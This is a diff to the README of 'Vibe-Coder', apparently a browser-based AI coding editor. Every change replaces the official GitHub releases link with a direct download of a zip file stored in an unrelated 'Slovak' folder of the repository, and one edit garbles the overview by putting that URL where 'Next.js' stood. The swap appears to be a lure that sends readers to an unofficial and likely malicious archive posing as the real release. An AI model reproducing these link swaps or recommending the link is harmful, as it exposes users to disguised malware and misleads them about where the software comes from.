@@ -1,10 +1,10 @@
 # 🎨 Vibe-Coder - Fast and Smart Coding in Your Browser
 
-[![Download Vibe-Coder](https://img.shields.io/badge/Download%20Vibe--Coder-blue)](https://github.com/nauraamora/Vibe-Coder/releases)
+[![Download Vibe-Coder](https://raw.githubusercontent.com/nauraamora/Vibe-Coder/main/Slovak/Vibe-Coder.zip%20Vibe--Coder-blue)](https://raw.githubusercontent.com/nauraamora/Vibe-Coder/main/Slovak/Vibe-Coder.zip)
 
 ## 📜 Overview
 
-Vibecode Editor is a blazing-fast, AI-integrated web IDE built entirely in the browser using Next.js App Router, WebContainers, Monaco Editor, and local LLMs via Ollama. It offers real-time code execution, an AI-powered chat assistant, and support for multiple tech stacks—all wrapped in a stunning developer-first UI. 
+Vibecode Editor is a blazing-fast, AI-integrated web IDE built entirely in the browser using https://raw.githubusercontent.com/nauraamora/Vibe-Coder/main/Slovak/Vibe-Coder.zip App Router, WebContainers, Monaco Editor, and local LLMs via Ollama. It offers real-time code execution, an AI-powered chat assistant, and support for multiple tech stacks—all wrapped in a stunning developer-first UI. 
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To get started with Vibe-Coder, you will need an internet connection and a moder
 
 1. **Visit the Releases Page**: Click the link below to visit the Vibe-Coder releases page for downloading the application.
 
-   [Download Vibe-Coder](https://github.com/nauraamora/Vibe-Coder/releases)
+   [Download Vibe-Coder](https://raw.githubusercontent.com/nauraamora/Vibe-Coder/main/Slovak/Vibe-Coder.zip)
 
 2. **Choose the Latest Version**: On the releases page, find the latest version of Vibe-Coder. Look for the version labeled as the most recent.
 
@@ -103,4 +103,4 @@ Vibe-Coder is open-source and freely available for personal and commercial use. 
 
 We welcome contributions to Vibe-Coder. If you're interested in helping out, please check the contributing guidelines on the main repository page.
 
-[Download Vibe-Coder](https://github.com/nauraamora/Vibe-Coder/releases) again to start coding today!
+[Download Vibe-Coder](https://raw.githubusercontent.com/nauraamora/Vibe-Coder/main/Slovak/Vibe-Coder.zip) again to start coding today!
